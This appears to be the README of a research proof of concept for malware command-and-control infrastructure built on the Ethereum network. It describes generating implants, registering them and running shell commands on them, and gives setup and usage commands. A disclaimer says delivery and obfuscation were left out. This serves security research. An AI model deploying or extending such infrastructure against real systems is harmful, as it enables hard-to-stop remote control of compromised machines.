# About
This is a POC fully functional C&C infrastructure on top of the public Ethereum network. The POC demonstrates a novel channel for implant and controller communication. By leveraging the blockchain as intermediate, the infrastructure is virtually unstoppable, dealing with most of the shortcoming of regular malicious infrastructures. Namely:
- Secure communications – Immune to data modifications, eavesdropping, MITM, replay attacks (V)
- High availability – node can always find the C&C (V)
- Scalable – Can support any number of implants and any load of transactions. (VX)
- Authentication – Only valid implants can connect, And only once. Resist replays, honeypotting. (V)
- Anonymity – No info can be gained on network operators. (V)
- Zero data leakage – No data can be gathered on other implants, data or network structure. (V)
- Takedown resistant – No single point of failure. Fully TNO. (V)
- Takeover resistant – No vulnerabilities or logic path that allows adversarial control of network. (V)
- Low operational costs (X)

[For more details see the research paper on our wiki (TBA)](https://github.com/platdrag/UnblockableChains.wiki.git)

Demo:

[![DEMO](https://img.youtube.com/vi/82BalW09F54/0.jpg)](https://www.youtube.com/watch?v=82BalW09F54)

Contract is written in solidity, controller and implant code in python (using web3.py)

# Disclaimer
This project was created for Educational and Research purposes only. Its only purpose is to educate the security community of new and possibly emerging vector that attackers might use in the future. Illegal use of this and its variants or inclusion of it in illegal activities is not encouraged by its author (and was activly discouraged by removing some key components, see what is not included section).  

# Features
- Controller panel
- Autorun & sync geth node
- Private / Rinkeby testnet / Mainnet work modes
- Contract deployment
- Wallet generation
- Implant generation
- Access management
- Send commands, execute, and return results from implants
- Fund transfers

### What is not included (yes, on purpose)
- Implant packaging, obfuscating and delivery
- Industry grade Encrpytion
- MachineId code


# Installation
Runs on linux or Windows 10 (with linux subsystem installed) only.

`git clone https://github.com/platdrag/UnblockableChains`

`cd UnblockableChains`

`python3 -m venv .\venv`

Windows: `venv\Scripts\activate.bat`

Linux: `venv\Scripts\activate`

`pip install -r requirements.txt`

* Windows: visual studio build tools might be needed

### Dependencies
- see requirements.txt

# Usage 
Following instruction are for **linux**. For Windows just replace / with \ in paths
### Using the CLI
Edit the deployment script (optional) at `conf/deployment/DeploymentConf.BASE.yaml`

Run the server bootstrap script. It will generate owner account, run a local full geth node, deploy the smart contract and create all necessary configuration to run controller UI. Optional:

`export PYTHONPATH=./src && python3 src/Server/DeployUnstoppableCnC.py .`

Run the server in interactive mode & use the `sc` object to issue commands:

`python3 -i src/Server/ServerCommands.py .`

* Available commands: generateNewClientInstance, allowInstance, removeInstance, addWork, fundTransfer

Generate a new bot client instance:

`>>> sc.generateNewClientInstance(1000000000000000000,opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'), port=30304)`

Note the generated wallet address. Implant will be placed under `./generated/<GeneratedWalletAddress>`
Transfer the implant to destination machine and run it:

`export PYTHONPATH=./src && python3 -i ./src/Client/ClientCommands.py . ./conf/clientConf.yaml`

Client will run its own node, contact the contract and register with it. If successful, it will start a listener for incoming commands.

Once client has registered, back on the server side use interactive shell to add work to the client:

``` 
>>> sc.addWork('0xa55be06a805566d480103cea559c4d1bc3f729d2', 'echo awesome')
// ... log output
... confirmed match between instance issued command and result: ['echo awesome', 'awsome']
```

### Using the web UI
Run the deployment script as described above
Create `static/`, `templates` dir symlinks:

`ln -s src-webapp/static .`
`ln -s src-webapp/templates .`

Run the webapp:

`export PYTHONPATH=src`
`python3 src-webapp/ecnc-webapp.py`

Access `http://127.0.0.1:5000/`

Generate one or more implants

Run client nodes as described above

Wait for the clients to register

Add/rm clients from index

Run shell commands on index-included clients 

# Todos (Future work)
- Implement public key encryption
- Split fund to generated implant to a small fee up front that will suffice only registration and then transfer the rest after registration.
- Support multiple contract addresses
- Support placing command/result data to Swarm, only put hash on blockchain. 
- Allow Transfer messages using whisper
- Allow controller the return funds from a compromised implant account.
